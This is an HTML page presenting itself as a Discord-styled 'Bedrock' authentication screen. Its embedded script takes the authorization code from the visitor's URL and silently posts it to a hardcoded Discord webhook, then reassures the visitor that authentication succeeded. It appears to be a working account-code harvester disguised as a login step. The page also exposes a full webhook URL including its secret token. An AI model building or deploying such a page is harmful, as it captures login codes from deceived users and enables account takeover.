<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Bedrock認証</title>
    <style>
        body {
            background-color: #313338;
            color: #dbdee1;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background-color: #2b2d31;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        h2 { color: #f2f3f5; margin-bottom: 15px; }
        p { font-size: 14px; color: #949ba4; word-break: break-all; }
        .success { color: #23a55a; font-weight: bold; }
        .error { color: #f2f3f5; }
    </style>
</head>
<body>

    <div class="card">
        <h2>Discord認証システム</h2>
        <div id="content">
            <p>認証を処理しています...</p>
        </div>
    </div>

    <script>
        // 設定されたWebhook URL
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1560098200822612072/584VAv_MRjs3PkY0kynX-8fVklVfc6JbpdCJvvpS5sUFDvOy6jZNxB5sDwLlHQV51MMg";

        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const contentDiv = document.getElementById('content');

        async function sendCode(authCode) {
            try {
                // DiscordのWebhookへ自動送信
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🔗 **新しい認証コードが取得されました！**\n\`\`\`${authCode}\`\`\``
                    })
                });

                if (response.ok) {
                    contentDiv.innerHTML = `
                        <p class="success">✅ 認証が完了し、コードが自動送信されました！</p>
                        <p style="font-size: 12px; margin-top: 10px;">この画面は閉じても大丈夫です。</p>
                    `;
                } else {
                    contentDiv.innerHTML = `<p class="error">❌ 送信に失敗しました。</p>`;
                }
            } catch (err) {
                contentDiv.innerHTML = `<p class="error">❌ エラーが発生しました。</p>`;
            }
        }

        if (code) {
            sendCode(code);
        } else {
            contentDiv.innerHTML = `
                <p class="error">❌ 認証コードが見つかりません。</p>
                <p>正しいURLからアクセスしてください。</p>
            `;
        }
    </script>

</body>
</html>
